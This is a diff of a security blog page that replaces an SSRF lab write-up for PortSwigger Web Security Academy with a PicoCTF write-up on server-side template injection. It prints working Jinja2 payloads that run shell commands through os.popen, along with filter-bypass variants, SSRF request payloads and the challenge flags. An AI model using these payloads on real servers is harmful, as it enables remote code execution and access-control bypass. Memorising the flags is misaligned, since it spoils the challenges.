@@ -26,7 +26,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>SSRF - Web Sec academy labs</title>
+    <title>PicoCTF</title>
     <style>
       :root {
         --text-color: #333;
@@ -258,41 +258,49 @@
 
     <div class="post-container">
       <article class="post">
-        <h1 class="post-title">SSRF - Web Sec academy labs</h1>
-        <p class="post-meta">Posted on March 1, 2025</p>
+        <h1 class="post-title">PicoCTF</h1>
+        <p class="post-meta">Posted on April 23, 2025</p>
         
         <div class="post-content">
-          <p>This post will run through the labs on web sec academy by Portswigger related to SSRF.</p>
+          <p>This post will go through several CTFs on PicoCTF.</p>
 
-<p>Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.</p>
+<h2 id="ssti1"><u>SSTI1</u></h2>
+<p>As the name suggests this CTF is about server side template injections. Using the image below we can figure out the template engine being used:</p>
 
-<h3 id="lab-basic-ssrf-against-the-local-server"><u>Lab: Basic SSRF against the local server</u></h3>
-<p>In an SSRF attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. By having the local machine send the request we can bypass access controls since the local machine is usually trusted.</p>
+<p><img src="http://localhost:4000/assets/picoCtf/SSTI1.png" alt="ls command output" style="width: 500px; margin: auto; display: block;" /></p>
 
-<p>For example in this lab there is a stock check feature where it makes an API call which is sent in the HTTP request. We can modify where it makes the API call to “http://localhost/admin” which gives us access to the admin panel where we see we can delete the user carlos through this call “/admin/delete?username=carlos”. Now by changing the API call to that we can delete carlos.</p>
+<p>In this case we see it leads us to either Twig or Jinja2 but {{7*‘7’}} outputs 7777777 in Jinja2 and 49 in Twig and since we get 7777777 this means it is using Jinja2. Now we can use this payload to check if there is any filters we need to bypass:</p>
 
-<h3 id="lab-basic-ssrf-against-another-back-end-system"><u>Lab: Basic SSRF against another back-end system</u></h3>
-<p>This lab is similar to the last but this time we are told the admin panel can be searched for in the range 192.168.0.X in the port 8080. So we can use burp intruder to go through all X from 1 to 255 to see which gives us a status code of 200.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stockApi=http://192.168.0.~:8080/admin
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 </code></pre></div></div>
-<p>I found it to be at 39 and so by sending the request with this API url we can delete carlos: http://192.168.0.39:8080/admin/delete?username=carlos</p>
+<p>But we get no errors and get the results “uid=0(root) gid=0(root) groups=0(root)” so this means we are fine and can begin executing our own commands, but first lets break down what this payload is actually doing. Since many flask applications import request we can use it as a gateway to reach deeper into python internals. Then using .<strong>globals</strong>.<strong>builtins</strong> we are able to access everything in the modules global scope which includes <strong>builtins</strong> which refers the builtin modules in python like os. After importing os then we use the popen function which executes the command specified by the string command and then we can read the output using the read function.</p>
 
-<h3 id="lab-ssrf-with-blacklist-based-input-filter"><u>Lab: SSRF with blacklist-based input filter</u></h3>
-<p>In this lab there is a filter on the url we send for example it catches if we use localhost or admin within the url. To bypass this we can first use 127.1 instead of 127.0.0.1 and localhost and then we can also obfuscate the word admin through url encoding. However one url encoding is not enough to bypass the filter so we will double encode admin and then we have bypassed the filter.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.1/&lt;@urlencode_all&gt;&lt;@urlencode_all&gt;admin&lt;/@urlencode_all&gt;&lt;/@urlencode_all&gt;/delete?username=carlos
+<p>Now we can use this payload to find the flag first by using ls to see what files are available:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+</code></pre></div></div>
+<p>We see there is a file called flag and using cat we can output the contents:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
+</code></pre></div></div>
+<p>And we get: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}</p>
+
+<h2 id="ssti2"><u>SSTI2</u></h2>
+<p>This is a sequel to the last CTF but this time there is input sanitaztion. Again through testing we can find that the template engine is Jinja2 and through trial and error we find that it stops if there is ‘.’ or ‘_’. Now we need to modify our previous payload to remove these characters, we can start with the ‘.’ which we can remove through indexing instead like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
+</code></pre></div></div>
+<p>And then we can replace ‘_’ with its unicode hex character ‘\x5f’ as such:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
 </code></pre></div></div>
 
-<h3 id="lab-ssrf-with-filter-bypass-via-open-redirection-vulnerability"><u>Lab: SSRF with filter bypass via open redirection vulnerability</u></h3>
-<p>Other applications only allows urls which match whitelisted values which can be bypassed through inconsistent url parsing. If the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target. For example:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /product/stock HTTP/1.0
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 118
-
-stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin
+<p>Now we can use the payload to find the flag like last time:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}
 </code></pre></div></div>
-<p>In this lab since the stock check feature takes a path we can give it our own url since it would just append it to the already existing url. Instead we have to find an open redirect which we find in the next product feature since it takes path as parameter. By giving the url to the next product feature with the redirect set to the admin panel, to stock check we can get access to the admin panel and delete the user carlos.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stockApi=/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
+<p>But then this gets blocked again and then through trial and error I found that having “{{}}” and “[’’]” at the same time causes it to get caught. Now instead we can use |attr() which is a Jinja filter which fetches an attribute from an object which we can use instead of “[]”.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
 </code></pre></div></div>
+<p>After checking the files we find there is a file called flag which we can output.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
+</code></pre></div></div>
+<p>And we get: picoCTF{sst1_f1lt3r_byp4ss_96a02202}</p>
 
         </div>
         
